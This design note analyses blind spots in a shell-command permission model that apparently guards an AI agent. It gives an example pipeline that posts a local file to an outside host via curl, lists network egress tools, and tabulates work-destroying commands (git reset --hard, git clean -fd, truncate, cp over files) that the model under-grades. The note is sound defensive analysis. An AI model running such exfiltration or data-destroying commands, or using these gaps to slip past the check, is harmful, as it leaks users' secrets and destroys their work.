# Hazards with no vocabulary

STATUS: **design note, nothing built.** Written 2026-07-28 after the redirect
sweep, as successive answers to "what can the previous analysis not see?"

Two findings, one form: **the model is precise about the wrong thing.** §1 is a
hazard with no term in the language. §2 is a term whose axis measures the wrong
property. Neither is a bug — no line of code is wrong — which is exactly why no
amount of code review was ever going to surface them.

# §1 — Confidentiality flow

## The escalation that produced it

Each pass this week found what the previous one structurally could not, because
each asked a different *question*, not a better version of the same one:

| pass | question | blind to |
|---|---|---|
| diff review | is this change correct? | rules whose sites were never edited together |
| site census | is this rule applied everywhere? | rules the outcome path never consults |
| the `>` reframe | is this the rule that governs the outcome? | signals an override skips |
| the ledger | what does this override skip, and what covers it? | hazards no rule can express |

The ledger works *inside* the permission model's decomposition. It assumes the
**stage** is the unit that carries danger. This note is what you find when you
question that.

## The finding

Exfiltration is not a property of any stage.

```
rules: allow cat *   allow curl *

Allow   cat ~/notes.md | curl -X POST --data-binary @- https://example.com
        stages = [Allow, Allow]
```

Both stages are individually unobjectionable and individually granted. **The
pipe is the exfiltration**, and nothing in the model looks at pipes as carrying
data. The `~/.ssh/id_rsa` variant asks — but only because the credential *path
list* caught the `cat`, not because anything understood where the bytes go.

There is no rule a user could write to express "reads must not reach the
network." The policy vocabulary is program, flags, operands, effect, path. It
has no term for a flow, and no term for egress.

## What exists, and what is missing — they are duals

`shell/provenance.rs` is a real flow analysis: **backward**, demand-driven from
dangerous sinks, answering *"what decides what `rm -r "$FOO"` deletes?"* That is
an **integrity** question — can an untrusted value steer a dangerous action.

Its dual is **confidentiality**: forward, from sensitive sources to egress
sinks, answering *"where do these bytes end up?"* That analysis does not exist,
and neither does the vocabulary it would need:

- **no egress sink concept.** `curl`, `wget`, `nc`, `scp` are not in
  `program.rs` at all. The model cannot mark "data leaves here."
- **no source sensitivity axis.** `Effect` grades damage to the machine
  (ReadOnly … Destructive/Executor). Nothing grades *value of what is read*.
  `sensitive_path` is consulted as an override, not as an axis that composes.

So the machinery shape is proven in this codebase; only the axis is absent.

## The trap: today's safety is an artifact of ignorance

Under defaults the pipeline above Asks — because `curl` is **unmodeled**, so it
lands in `Effect::Unknown`, which fails closed. That protection is accidental.

**Modeling `curl` would remove it.** Adding `curl` to `program.rs` is an obvious
improvement any shell analyzer wants, and whoever does it will reasonably
classify it `ReadOnly` (it fetches) or `Mutating` (it writes with `-o`). Either
makes `cat secrets | curl attacker` grade cleaner than it does today. **A
well-intentioned improvement to the model would silently widen the hole.** That
is worth knowing before someone does it, which is the whole reason this note
exists.

Anyone modeling a network program must add the egress axis in the same change.

## The generalizable rule this produced

> **An enumeration of dangerous instances is the signature of an unmodeled
> hazard.** Where the only defence against a hazard is a curated list, the list
> is a *proxy* for a property nobody computed — and a proxy cannot be completed,
> only extended.

The check that separates a healthy list from a proxy list: **does the list feed
a modeled axis, or IS it the defence?**

| list | feeds | verdict |
|---|---|---|
| `ENV_HAZARD` | `Bindings::Disturbed` | healthy — an axis exists |
| `defaults.rs` find-executor family | `Effect::Executor` | healthy |
| credential issuer prefixes | redaction, **plus** a high-entropy fallback | healthy — has a non-enumerative backstop |
| `sensitive_path` | *nothing* — it is the defence | **proxy: unmodeled hazard** |

This retroactively explains the project's own note that shipped lists are
"seeds, not the list" (`[[project_shannon_secrets]]`). It is true, and the reason
is structural: you cannot finish a list that stands in for a property. `.env`,
`id_rsa` and `.netrc` are on it; `notes.md`, `.env.local`, a customer CSV and
the source tree are not, and never will be.

## Not a live bypass — a structural gap

Defaults are safe today (see the trap above for how long that lasts). Reaching
it needs permissive user rules, which is the rung we document for reducing
prompt fatigue. Recording it as a **design gap** rather than a vulnerability:
the honest statement is "the model cannot express this hazard", not "the model
gets this wrong."

## If we build it

Smallest thing that would pay: an **egress** capability on the program model
(`curl`, `wget`, `nc`, `scp`, `ssh`, `git push`, plus `>` to `/dev/tcp/…`), and
a rule predicate that can name it — so a user can write
`ask :egress` or `deny :egress` and mean it. That alone turns the pipeline above
into a prompt without any flow analysis at all.

Flow (source-sensitivity reaching an egress sink) is the fuller answer and
should reuse `provenance`'s discipline verbatim: **never invent a link we cannot
trace**, idiom-scoped, fail-open, because over-tainting is the documented
failure mode of every taint tool and alarm fatigue is what this project exists
to prevent.


# §2 — The effect lattice grades by mechanism, not by loss

## The finding

The same consequence is graded three different ways, according to which syscall
happens to achieve it:

| command | `Effect` | what the user loses |
|---|---|---|
| `rm important.rs` | **Destructive** | the file |
| `cat /dev/null > important.rs` | **Mutating** | the file |
| `truncate -s 0 important.rs` | **Unknown** | the file |
| `mv scratch.rs important.rs` | **Unknown** | the previous contents |
| `cp scratch.rs important.rs` | **Unknown** | the previous contents |
| `git reset --hard` | **Unknown** | every uncommitted change |
| `git clean -fd` | **Unknown** | every untracked file |
| `sort -o f f` | **Unknown** | `f`, if the sort fails partway |

The lattice's own documentation contains the counterexample. `Destructive` is
defined as *"Irreversibly **removes** (`rm`, `shred`, `find -delete`)"* —
removal is a mechanism — while `Mutating` is *"Changes state within scope
(`mkdir`, **`cp`**, `tar -x`)"*. `cp a b` irreversibly destroys `b`. The
definition claims irreversibility; the implementation encodes removal.

## Why this is the deeper cut

Our stated adversary is *"an EAGER OPTIMIZER not an attacker"*
(`[[project_shannon_security_posture]]`) — something that takes locally rational
shortcuts to finish the task. **That adversary does not escalate privilege; it
destroys work.** `git reset --hard` to get a clean tree, `> config.toml` to
rewrite a file, `git clean -fd` to remove clutter, `cp` a generated file over a
hand-edited one. Every one of those is a plausible next step for a helpful
agent, and every one is graded `Unknown` or `Mutating` today.

Meanwhile the axis we *did* build precision into — removal — is the one an
eager optimizer reaches for least often, because `rm` looks dangerous even to
the model.

## Why the wrong axis was chosen, and it was not carelessness

**Mechanism is computable; loss is not.** Whether `> f` destroys anything
depends on whether `f` existed, whether it was tracked, whether it was
committed, whether the user cares. Whether `rm` is a removal is decidable from
the token alone. So the observable axis got encoded, and then documented in the
vocabulary of the meaningful one.

That substitution is invisible precisely because the words match: "Destructive"
*sounds* like it means "you lose something."

## The reusable diagnostic

> **Look for two commands with identical consequence and different
> classifications.** That is a mechanism-shaped axis, and it is mechanically
> detectable — no threat-modelling workshop required.

Generalised:

> **A classification's axis must match the consequence you are defending
> against, not the mechanism you can most cheaply observe.** When they diverge,
> the model becomes precise about the wrong thing — and the documentation will
> describe the consequence, because that is what the author meant.

## The asymmetry worth sitting with

Shannon has a rigorous recoverability model **for its own data**: history is
never silently destroyed, compositions build new sessions and keep originals,
structural sharing means nothing is copied or lost, and only `:delete` deletes.
We were meticulous about never losing a conversation turn.

For the user's files we grade by verb.

## If we act on it

The honest axis is **recoverability**, and it is context-dependent — which is
why it was avoided, and also why it is worth having:

- `> f` where `f` is tracked and committed → recoverable (git has it)
- `> f` where `f` is untracked → unrecoverable
- `git reset --hard` with a dirty tree → unrecoverable; with a clean tree → a
  no-op

Cheapest first step that does not require a recoverability oracle: stop
grading `>`/`>>`-onto-an-existing-path, `mv`/`cp`-onto-an-existing-path, and the
known work-destroying VCS verbs as `Mutating`/`Unknown`, and give them the same
rung as `rm`. That is a lattice change, not an analysis change.

**And the same trap as §1 applies with more force here:** these are safe today
only because they are `Unknown` and `Unknown` fails closed. Whoever models
`cp`, `mv`, `tee`, `truncate` or `git` — all obvious, wanted improvements —
will classify them by mechanism, because that is what the lattice's definitions
ask for, and will *silently downgrade* them from Ask to Allow. Model them by
loss, or the improvement is a regression.
